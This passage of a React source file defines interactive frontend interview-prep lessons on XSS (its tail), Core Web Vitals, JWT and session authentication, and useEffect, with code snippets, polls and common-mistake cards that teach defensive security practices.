      fix="React protects you in JSX expressions ({value}), but not everywhere. dangerouslySetInnerHTML, href attributes with user input, and eval() all bypass React's protection. Also, server-side rendering with unsanitized data can produce XSS even before React hydrates."
    />

    <DidYouKnow fact="The biggest XSS attack in history was the 'Samy worm' on MySpace in 2005. A user named Samy Kamkar inserted XSS into his profile. Within 20 hours, 1 million users were infected and added Samy as a friend. MySpace had to take the site offline." color="#ef4444" />

    <InterviewMeter topics={[
      { topic: 'innerHTML vs textContent', freq: 85 },
      { topic: 'Types of XSS (stored, reflected, DOM)', freq: 75 },
      { topic: 'Content Security Policy', freq: 70 },
      { topic: 'React and dangerouslySetInnerHTML', freq: 65 },
    ]} />
  </div>
);

export const CWVLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#f9731640' delay={0}>
      <div style={c.title('#f97316')}>🎬 Why Google Made These Metrics a Ranking Factor</div>
      <p style={c.prose}>In 2021, Google added Core Web Vitals to its search ranking algorithm. Sites with poor vitals rank lower — even with great content. As a senior engineer, <strong style={{ color: '#f97316' }}>you're now responsible for SEO through code quality</strong>.</p>
    </RevealCard>

    <AnalogyCard
      emoji="🚗"
      title="A car review — not just speed"
      analogy="Old web perf was like rating cars only by top speed. Core Web Vitals added: How fast does it feel to start (LCP)? Does the steering respond immediately (INP)? Does the seat randomly shift while driving (CLS)? A complete user experience rating."
      connection="LCP = time to meaningful content. INP = response to every interaction. CLS = visual stability. All measured from real user data (field data) not just lab tests."
    />

    <StorySteps steps={[
      { title: 'LCP: When does the main content appear?', color: '#4facfe', desc: 'LCP measures the largest element visible in the viewport — usually a hero image or headline. Target: under 2.5s. The biggest killer is render-blocking resources.', code: `<!-- ✅ Preload LCP image — biggest single impact -->
<link rel="preload" as="image" href="/hero.webp"
      fetchpriority="high" />

<!-- ❌ Never lazy-load the LCP element -->
<!-- <img loading="lazy" src="/hero.webp"> ← kills LCP -->` },
      { title: 'INP: Does every interaction feel instant?', color: '#00ff88', desc: 'INP replaced FID in March 2024. It measures ALL interactions (every click, tap, key), not just the first one. Long JS tasks on the main thread are the main cause.', code: `// ❌ Long task blocks INP
button.onclick = () => {
  heavyComputation(); // 200ms → poor INP
};

// ✅ Break up work to stay under 50ms
button.onclick = async () => {
  updateUI(); // respond immediately
  await scheduler.yield(); // yield to browser
  await heavyComputation(); // rest later
};` },
      { title: 'CLS: Does the page jump around?', color: '#a855f7', desc: 'Every time content shifts unexpectedly, CLS accumulates. The most common causes: images without dimensions, late-loading web fonts, ads injected above content.', code: `<!-- ✅ Always reserve image space -->
<img src="photo.jpg" width="800" height="600" alt="">

<!-- CSS prevents shift for dynamic content -->
.ad-slot { min-height: 250px; } /* reserve space */

/* ✅ Font loading without shift */
@font-face {
  font-display: swap;
  size-adjust: 105%; /* match fallback metrics */
}` },
      { title: 'Measure with real user data', color: '#eab308', desc: 'Lab tools (Lighthouse) are useful but field data (real users) is what Google uses. CrUX (Chrome User Experience Report) is the actual data source.', code: `// Measure in your app with web-vitals
import { onLCP, onINP, onCLS } from 'web-vitals';

onLCP(metric => sendToAnalytics(metric));
onINP(metric => sendToAnalytics(metric));
onCLS(metric => sendToAnalytics(metric));` },
    ]} />

    <InlinePoll
      question="A hero image loads in 400ms but LCP is reported as 3.8s. What's the most likely cause?"
      options={['Image format is wrong', 'Image was initially hidden with display:none or visibility:hidden', 'Too many images on the page', 'Server is slow']}
      correct={1}
      explanation="LCP measures when the element BECOMES VISIBLE. If a loading skeleton hides the image with display:none and then shows it later, the LCP clock keeps running until the element is visible — even though the image bytes loaded earlier."
    />

    <CommonMistake
      mistake="Adding loading='lazy' to ALL images to improve performance, including the hero image above the fold."
      fix="Lazy loading the LCP element is one of the most common performance anti-patterns. Only lazy-load images BELOW the fold. The LCP image should have fetchpriority='high' and no lazy loading."
    />

    <DidYouKnow fact="Google's own studies show that improving LCP from 'Poor' to 'Good' increases conversion rates by up to 14%. CLS improvements on e-commerce sites reduced accidental clicks by 44% — users were clicking 'Buy' when the page shifted and they meant to click elsewhere." color="#f97316" />

    <InterviewMeter topics={[
      { topic: 'What LCP, INP, CLS measure', freq: 85 },
      { topic: 'How to improve LCP specifically', freq: 80 },
      { topic: 'INP vs old FID metric', freq: 65 },
      { topic: 'Measuring with web-vitals library', freq: 60 },
    ]} />
  </div>
);

export const AuthLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#00ff8840' delay={0}>
      <div style={c.title('#00ff88')}>🎬 The Authentication Problem</div>
      <p style={c.prose}>HTTP is stateless — each request is independent. The server doesn't remember you between requests. Authentication is how we solve this: <strong style={{ color: '#00ff88' }}>proving identity on every request</strong> without asking users to log in every time.</p>
    </RevealCard>

    <AnalogyCard
      emoji="🎫"
      title="Concert wristbands vs VIP passes"
      analogy="Sessions are like getting a wristband at the door — staff (server) keeps a list, and they check your wristband against the list each time. JWTs are like a VIP pass with a hologram — staff (server) can verify it's real just by looking at it, without checking any list."
      connection="Sessions: stateful (server stores data). JWT: stateless (token contains data, server just verifies signature)."
    />

    <StorySteps steps={[
      { title: 'JWT structure: 3 parts', color: '#4facfe', desc: 'A JWT is header.payload.signature — base64 encoded, dot-separated. The payload carries user data. The signature proves it wasn\'t tampered with.', code: `// JWT = base64(header).base64(payload).signature
{
  "alg": "HS256",  // header
  "typ": "JWT"
}
{
  "id": "123",     // payload (public data)
  "role": "admin",
  "exp": 1700000000
}
// HMACSHA256(header + "." + payload, secret)` },
      { title: 'Access + Refresh token pattern', color: '#00ff88', desc: 'Short-lived access token (15min) for API calls. Long-lived refresh token (7 days) to get new access tokens. If access token is stolen, it expires quickly.', code: `// Access token: in memory (NOT localStorage!)
let accessToken = null; // stolen by XSS only if in memory briefly

// Refresh token: httpOnly cookie
// ← JS cannot read this (XSS-safe)
res.cookie('refresh', token, {
  httpOnly: true,  // no JS access
  secure: true,    // HTTPS only
  sameSite: 'strict' // no CSRF
});` },
      { title: 'Refresh token rotation', color: '#a855f7', desc: 'Every time you use a refresh token, invalidate it and issue a new one. If someone steals an old refresh token and tries to use it, you detect the reuse and can invalidate everything.', code: `// On refresh:
1. Verify refresh token
2. Issue new access token
3. Issue NEW refresh token
4. Invalidate OLD refresh token in DB
// If old token used again → someone stole it!
// → Invalidate ALL refresh tokens for this user` },
      { title: 'Google OAuth: delegated identity', color: '#eab308', desc: 'Instead of building auth yourself, Google verifies identity. They give you an ID token (JWT). You verify it with Google\'s public keys, then issue your own session.', code: `// Client: use Google's button
const { credential } = googleResponse; // Google JWT

// Server: verify with Google
const ticket = await client.verifyIdToken({
  idToken: credential,
  audience: GOOGLE_CLIENT_ID,
});
const { sub, email, name } = ticket.getPayload();
// Now create your own session for this user` },
    ]} />

    <InlinePoll
      question="Where should you store a JWT refresh token for maximum security?"
      options={['localStorage — easy to access in JS', 'sessionStorage — cleared on tab close', 'httpOnly cookie — cannot be read by JS', 'In a global JS variable']}
      correct={2}
      explanation="httpOnly cookies are inaccessible to JavaScript — XSS attacks can't steal them. localStorage and sessionStorage are vulnerable to any XSS on your page. In-memory variables are lost on refresh."
    />

    <CommonMistake
      mistake="Storing the access token in localStorage 'because it's easier' and making JWT expiry 7 days 'for user convenience'."
      fix="localStorage is readable by any XSS on your page. Use memory for the access token and httpOnly cookies for the refresh token. Keep access tokens short-lived (15min). Long-lived JWTs can't be revoked if stolen — unlike sessions where you can just delete the DB record."
    />

    <DidYouKnow fact="The 'none' algorithm attack: the JWT spec allows 'alg: none' meaning no signature required. Attackers can craft a JWT claiming to be an admin with alg:none and some libraries would accept it. Always explicitly specify and verify the algorithm in your JWT library." color="#00ff88" />

    <InterviewMeter topics={[
      { topic: 'JWT vs session-based auth', freq: 80 },
      { topic: 'Where to store tokens (localStorage vs cookie)', freq: 90 },
      { topic: 'Refresh token rotation', freq: 70 },
      { topic: 'OAuth 2.0 flow', freq: 65 },
    ]} />
  </div>
);

export const UseEffectLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#00ff8840' delay={0}>
      <div style={c.title('#00ff88')}>🎬 Not a Lifecycle Method</div>
      <p style={c.prose}>Most developers think of useEffect as componentDidMount/componentDidUpdate/componentWillUnmount. This mental model is <strong style={{ color: '#ef4444' }}>wrong and causes bugs</strong>. The correct mental model: <strong style={{ color: '#00ff88' }}>useEffect synchronizes your component with an external system.</strong></p>
    </RevealCard>

    <AnalogyCard
      emoji="🔌"
      title="Like plugging in an appliance"
      analogy="When you plug in a fan (effect starts), it runs. When you unplug it (cleanup), it stops. If you swap it for a different fan (deps change), you unplug the old one and plug in the new one. You don't think about 'when' — just 'what should be connected.'"
      connection="useEffect(() => { subscribe(); return () => unsubscribe(); }, [url]) — connect when url changes, disconnect before changing."
    />

    <StorySteps steps={[
      { title: 'The dependency array controls when it runs', color: '#00ff88', desc: 'React compares deps with previous render. If any changed (Object.is comparison), it runs the effect. No array = every render. [] = once on mount.', code: `useEffect(fn);           // every render ← usually wrong
useEffect(fn, []);       // once on mount
useEffect(fn, [userId]); // when userId changes
useEffect(fn, [a, b]);   // when a OR b changes` },
      { title: 'Cleanup prevents memory leaks', color: '#4facfe', desc: 'The returned function runs before the NEXT effect AND on unmount. This is how you cancel subscriptions, clear timers, and abort fetches.', code: `useEffect(() => {
  const controller = new AbortController();
  fetch('/api', { signal: controller.signal })
    .then(r => r.json()).then(setData);

  return () => controller.abort(); // ← cleanup!
  // If userId changes: abort old fetch, start new one
}, [userId]);` },
      { title: 'The stale closure problem', color: '#ef4444', desc: 'An effect captures variables by value at render time. If you omit a dep to "prevent re-running", you get stale values — the effect sees old data forever.', code: `// ❌ Stale closure — count is always 0!
useEffect(() => {
  const id = setInterval(() => {
    setCount(count + 1); // count captured as 0 forever
  }, 1000);
  return () => clearInterval(id);
}, []); // missing 'count' dep!` },
      { title: 'Fix: functional updates and useRef', color: '#00ff88', desc: 'For state updates, use the functional form — no dependency needed. For values you want to read in an effect without rerunning it, use useRef.', code: `// ✅ Functional update — no stale closure
useEffect(() => {
  const id = setInterval(() => {
    setCount(c => c + 1); // always latest!
  }, 1000);
  return () => clearInterval(id);
}, []); // no deps needed ✓` },
    ]} />

    <InlinePoll
      question="You have useEffect(() => { fetchUser(userId); }, []). When userId changes, the component re-renders but doesn't fetch again. Why?"
      options={['useEffect only runs once by design', 'userId is missing from the dependency array', 'fetchUser is async so it skips', 'React batches effect re-runs']}
      correct={1}
      explanation="The empty [] means 'run once on mount'. Adding [userId] to the deps array makes React re-run the effect whenever userId changes. The ESLint react-hooks/exhaustive-deps rule would have caught this."
    />

    <CommonMistake
      mistake="Removing dependencies from the array to 'optimize' and prevent unnecessary re-runs: useEffect(() => { setTitle(user.name + count); }, [user]); // missing count"
      fix="Never lie to React about dependencies — this creates subtle stale-closure bugs. If the effect runs too often, fix the root cause: memoize the function, move it inside the effect, or use useCallback/useMemo on the dependency."
    />

    <DidYouKnow fact="The React team almost removed the dependency array and made useEffect always run after every render. They added it back because developers complained about performance. The exhaustive-deps ESLint rule exists specifically because the dependency array is so easy to get wrong." color="#00ff88" />

    <InterviewMeter topics={[
      { topic: 'Dependency array behavior', freq: 85 },
      { topic: 'Stale closure bug explanation', freq: 80 },
      { topic: 'Cleanup function and when it runs', freq: 75 },
      { topic: 'useEffect vs useLayoutEffect', freq: 60 },
    ]} />
  </div>
);

// ─────────────────────────────────────────────────────────────────────
// EXPORT MAP
// ─────────────────────────────────────────────────────────────────────
export const LEARN_COMPONENTS = {
  'event-loop':     EventLoopLearn,
  'closure-def':    ClosureLearn,
  'hoisting':       HoistingLearn,
  'this-keyword':   ThisLearn,
  'promise-internals': PromiseLearn,
  'fiber':          FiberLearn,
  'xss':            XSSLearn,
  'cwv':            CWVLearn,
  'auth-patterns':  AuthLearn,
  'useeffect-deep': UseEffectLearn,
};